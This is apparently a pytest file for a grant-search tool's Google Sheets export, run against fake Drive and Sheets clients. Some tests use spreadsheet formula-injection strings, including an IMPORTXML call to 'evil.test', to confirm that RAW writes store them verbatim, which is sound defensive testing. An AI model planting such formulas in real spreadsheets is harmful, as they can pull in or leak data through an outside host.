"""Grant's own Google Sheets export: guards, value coercion, and the create+share path.

All offline — the Google client is replaced with fakes that record every call, so we
assert on what Grant *would* send without any network or real credentials.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from googleapiclient.errors import HttpError

from grant_watch import google_sheets

REP_SLACK = "U01DPJVURHU"
REP_EMAIL = "chase@monarchconnected.com"


# ------------------------------------------------------------------ value coercion
def test_cell_coerces_none_and_preserves_scalar_types() -> None:
    """None becomes an empty cell; real numbers and strings pass through unchanged."""
    assert google_sheets._cell(None) == ""
    assert google_sheets._cell(500000) == 500000
    assert google_sheets._cell(-25.0) == -25.0
    # RAW input is never parsed, so a formula-like string is preserved verbatim (no
    # apostrophe): safety comes from valueInputOption=RAW, asserted below.
    assert google_sheets._cell("=IMPORTXML('x')") == "=IMPORTXML('x')"


# ------------------------------------------------------------------ guards
def test_create_sheet_requires_mapped_rep() -> None:
    """No roster identity fails immediately without touching Google."""
    state, message = google_sheets.create_sheet(
        "Export", ["entity"], [["District"]], "U_UNKNOWN", ""
    )
    assert state == "error" and "mapped" in message


def test_create_sheet_unconfigured_without_env(monkeypatch: pytest.MonkeyPatch) -> None:
    """Missing key/drive config degrades to the Excel fallback, never a crash."""
    monkeypatch.delenv("GOOGLE_SA_KEY_PATH", raising=False)
    monkeypatch.delenv("GRANT_EXPORTS_DRIVE_ID", raising=False)
    state, message = google_sheets.create_sheet(
        "Export", ["entity"], [["District"]], REP_SLACK, REP_EMAIL
    )
    assert state == "unconfigured" and "configured" in message


# ------------------------------------------------------------------ create + share path
class _FakeCall:
    """A pending Google API call whose result is returned by execute()."""

    def __init__(self, result: object) -> None:
        """Initialize the test double."""
        self._result = result

    def execute(self) -> object:
        """Return the canned result without any network I/O."""
        return self._result


class _FakeFiles:
    """Records files().create as files.create."""

    def __init__(self, log: dict[str, object]) -> None:
        """Initialize the test double."""
        self._log = log

    def create(self, **kwargs: object) -> _FakeCall:
        """Record the file-create call and hand back a fixed spreadsheet id/url."""
        self._log["files.create"] = kwargs
        return _FakeCall(
            {
                "id": "SID123",
                "webViewLink": "https://docs.google.com/spreadsheets/d/SID123",
            }
        )

    def delete(self, **kwargs: object) -> _FakeCall:
        """Record cleanup of an incomplete/unshared spreadsheet."""
        self._log["files.delete"] = kwargs
        return _FakeCall({})


class _HttpResponse:
    """Minimal httplib2-style response carried by googleapiclient HttpError."""

    status = 403
    reason = "forbidden"


class _FailCall:
    """A Google API call that fails with an HTTP 403 when executed."""

    def execute(self) -> object:
        """Raise the same exception type the real Google client uses."""
        raise HttpError(_HttpResponse(), b'{"error":"forbidden"}')


class _FakePermissions:
    """Records permissions().create as permissions.create."""

    def __init__(self, log: dict[str, object]) -> None:
        """Initialize the test double."""
        self._log = log

    def create(self, **kwargs: object) -> _FakeCall | _FailCall:
        """Record the share call."""
        self._log["permissions.create"] = kwargs
        if self._log.get("fail_share"):
            return _FailCall()
        return _FakeCall({})


class _FakeDrive:
    """Hands out distinct files/permissions helpers backed by a shared log."""

    def __init__(self, log: dict[str, object]) -> None:
        """Initialize the test double."""
        self._log = log

    def files(self) -> _FakeFiles:
        """Return the files helper."""
        return _FakeFiles(self._log)

    def permissions(self) -> _FakePermissions:
        """Return the permissions helper."""
        return _FakePermissions(self._log)


class _FakeSheets:
    """Records values().update and batchUpdate into a shared log."""

    def __init__(self, log: dict[str, object]) -> None:
        """Initialize the test double."""
        self._log = log

    def spreadsheets(self) -> "_FakeSheets":
        """Return self; values()/batchUpdate() below record their calls."""
        return self

    def values(self) -> "_FakeSheets":
        """Return self so update() can record the RAW write."""
        return self

    def update(self, **kwargs: object) -> _FakeCall:
        """Record the values.update (RAW header + rows) call."""
        self._log["values.update"] = kwargs
        return _FakeCall({})

    def batchUpdate(self, **kwargs: object) -> _FakeCall:  # noqa: N802 — Google API name
        """Record the header freeze/bold batchUpdate call."""
        self._log["batchUpdate"] = kwargs
        return _FakeCall({})


def _wire_fakes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> dict[str, object]:
    """Point the module at a dummy key file + fake Drive/Sheets services."""
    key_file = tmp_path / "sa.json"
    key_file.write_text("{}")
    monkeypatch.setenv("GOOGLE_SA_KEY_PATH", str(key_file))
    monkeypatch.setenv("GRANT_EXPORTS_DRIVE_ID", "DRIVEID")

    log: dict[str, object] = {}
    monkeypatch.setattr(
        "google.oauth2.service_account.Credentials.from_service_account_file",
        lambda *_a, **_k: object(),
    )

    def fake_build(service: str, _version: str, **_kwargs: object) -> object:
        """Return the fake matching the requested Google service."""
        return _FakeDrive(log) if service == "drive" else _FakeSheets(log)

    monkeypatch.setattr("googleapiclient.discovery.build", fake_build)
    return log


def test_create_sheet_writes_all_rows_raw_and_shares_with_rep(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """The export lands in the shared drive, writes every row as literal RAW text,
    shares with the rep, and returns the sheet URL."""
    log = _wire_fakes(monkeypatch, tmp_path)
    columns = ["entity", "amount"]
    rows: list[list[object]] = [
        ["City of Austin", 120000],
        ["=IMPORTXML('https://evil.test')", 1],
    ]

    state, url = google_sheets.create_sheet(
        "Grant search results", columns, rows, REP_SLACK, REP_EMAIL
    )

    assert state == "created"
    assert url == "https://docs.google.com/spreadsheets/d/SID123"

    # Created inside the Grant Exports shared drive, not My Drive.
    create_kwargs = log["files.create"]
    assert isinstance(create_kwargs, dict)
    assert create_kwargs["body"]["parents"] == ["DRIVEID"]
    assert create_kwargs["supportsAllDrives"] is True

    # Every row is present, header first, and the formula string is stored verbatim
    # because the write is RAW (never parsed as a formula).
    update_kwargs = log["values.update"]
    assert isinstance(update_kwargs, dict)
    assert update_kwargs["valueInputOption"] == "RAW"
    values = update_kwargs["body"]["values"]
    assert values[0] == columns
    assert len(values) == 1 + len(rows)
    assert values[2][0] == "=IMPORTXML('https://evil.test')"
    assert values[1][1] == 120000  # real number preserved

    # Shared with the requesting rep so the link opens in their account.
    share_kwargs = log["permissions.create"]
    assert isinstance(share_kwargs, dict)
    assert share_kwargs["body"]["emailAddress"] == REP_EMAIL
    assert share_kwargs["sendNotificationEmail"] is False


def test_create_sheet_maps_none_to_empty_cell(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """A NULL database value becomes an empty cell, not the string 'None'."""
    log = _wire_fakes(monkeypatch, tmp_path)
    google_sheets.create_sheet("x", ["a", "b"], [["only", None]], REP_SLACK, REP_EMAIL)
    values = log["values.update"]["body"]["values"]  # type: ignore[index]
    assert values[1] == ["only", ""]


def test_share_failure_removes_sheet_and_reports_error(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """An unshared sheet is deleted and never reported as a successful export."""
    log = _wire_fakes(monkeypatch, tmp_path)
    log["fail_share"] = True
    state, message = google_sheets.create_sheet(
        "x", ["entity"], [["District"]], REP_SLACK, REP_EMAIL
    )
    assert state == "error"
    assert "could not be shared" in message
    delete_kwargs = log["files.delete"]
    assert isinstance(delete_kwargs, dict)
    assert delete_kwargs["fileId"] == "SID123"
    assert delete_kwargs["supportsAllDrives"] is True
